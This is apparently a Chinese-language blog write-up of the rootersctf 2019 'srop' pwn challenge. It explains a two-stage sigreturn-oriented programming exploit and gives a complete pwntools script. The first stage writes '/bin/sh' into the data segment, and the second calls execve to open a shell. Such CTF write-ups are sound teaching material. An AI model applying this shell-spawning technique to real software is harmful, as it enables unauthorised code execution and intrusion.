# rootersctf_2019_srop



### 总结

根据本题，学习与收获有：

- `srop`用于溢出空间比较大的场景，需要注意：如果将`frame`的`rip`设置为`syscall;ret`，那么`rsp`指向地址，就是即将下一个栈帧的栈顶。程序会取`rsp`指向的地址或指令继续执行
- `leave;ret`指令的本质是`mov rbp rsp;pop rbp;pop rip`
- `srop`可以构造多个帧，特别是程序缺乏`/bin/sh`的时候，第`1`帧先想办法写`/bin/sh\x00`，然后第`2`帧执行`execve`

<!-- more -->

### 题目分析

#### checksec

![image-20210430224820873](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430224820873.png)

本题的环境为`ubuntu 18`

#### 函数分析

连`main`函数都没有，先看`start`函数吧

##### start

![image-20210430225858019](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430225858019.png)

流程很简单：`call 0x401000`，然后调用`exit`退出。

##### sub_0x401000

![image-20210430230100498](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430230100498.png)

纯汇编代码，流程是：

- `write(1, buf,0x2a)`
- `read(0, rsp-0x40, 0x400)`

#### 漏洞点

题目名叫`srop`，那肯定是使用`srop`来做题。溢出点也相当明显，`0x400`足够构造两个`srop`的帧了。

### 利用思路

#### 知识点

主要利用`srop`，参考[SROP - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/)，细节就不多讲了。需要注意`rip`和`rsp`。一般来说，`rip`会写成`syscall`的地址。

#### 利用过程

主要注意两点：1）本题可利用的`gadget`不多，并且只有`syscall;leave;ret`，所以需要注意，这里不需要修改`rsp`，而是`rbp`。2）程序中没有`/bin/sh`，但是有`data`段，所以需要往`data`段上写`/bin/sh`。因此，连续利用两次`srop`是个不错的方案。

步骤：

- 首先利用栈溢出，执行`read`的系统调用，往`0x402000`上写`/bin/sh`和第二帧，同时控制`rbp`，指向让第二帧的`signal frame`。第二帧就布置在已知地址的`data`段上。
- 让第二帧`signal frame`写入`execve`，获取`shell`

### EXP

#### 调试过程

- 写入第一帧`signal frame`

  ```python
  data_addr = 0x402000
  syscall_leave_ret = 0x401033
  pop_rax_syscall_leave_ret = 0x401032
  syscall_addr = 0x401046
  
  frame = SigreturnFrame(kernel="amd64")
  frame.rax = 0 # read 
  frame.rdi = 0 # stdin
  frame.rsi = data_addr
  frame.rdx = 0x400
  frame.rip = syscall_leave_ret
  frame.rbp = data_addr + 0x20
  
  layout = [0x88 * "a", pop_rax_syscall_leave_ret, 0xf, bytes(frame)]
  
  # srop to call read, set *data_addr = /bin/sh\x00
  sh.sendlineafter("Hey, can i get some feedback for the CTF?\n", flat(layout))
  ```

  ![image-20210430232240304](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430232240304.png)

- 写入第二帧`signal frame`

  ```python
  # call execve /bin/sh
  layout = ["/bin/sh\x00", "a" * 0x20, pop_rax_syscall_leave_ret, 0xf]
  
  frame = SigreturnFrame(kernel="amd64")
  frame.rax = 59 # execve 
  frame.rdi = data_addr # stdin
  frame.rsi = 0
  frame.rdx = 0
  frame.rip = syscall_addr
  
  layout.append(bytes(frame))
  
  sh.sendline(flat(layout))
  sh.interactive()
  ```

  ![image-20210430232153324](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430232153324.png)
  
  ![image-20210430232352540](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430232352540.png)

最后打远程效果为：

![image-20210430232539501](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210430232539501.png)

#### 完整exp

```python
from pwn import *
sh = process("rootersctf_2019_srop")
context.update(arch="amd64", os="linux", endian="little")

# write /bin/sh on 0x402000
data_addr = 0x402000
syscall_leave_ret = 0x401033
pop_rax_syscall_leave_ret = 0x401032
syscall_addr = 0x401046
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0 # read 
frame.rdi = 0 # stdin
frame.rsi = data_addr
frame.rdx = 0x400
frame.rip = syscall_leave_ret
frame.rbp = data_addr + 0x20
layout = [0x88 * "a", pop_rax_syscall_leave_ret, 0xf, bytes(frame)]
# srop to call read, set *data_addr = /bin/sh\x00
sh.sendlineafter("Hey, can i get some feedback for the CTF?\n", flat(layout))

# call execve /bin/sh
layout = ["/bin/sh\x00", "a" * 0x20, pop_rax_syscall_leave_ret, 0xf]
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59 # execve 
frame.rdi = data_addr # stdin
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
layout.append(bytes(frame))
sh.sendline(flat(layout))
sh.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-04-30-rootersctf-2019-srop/  

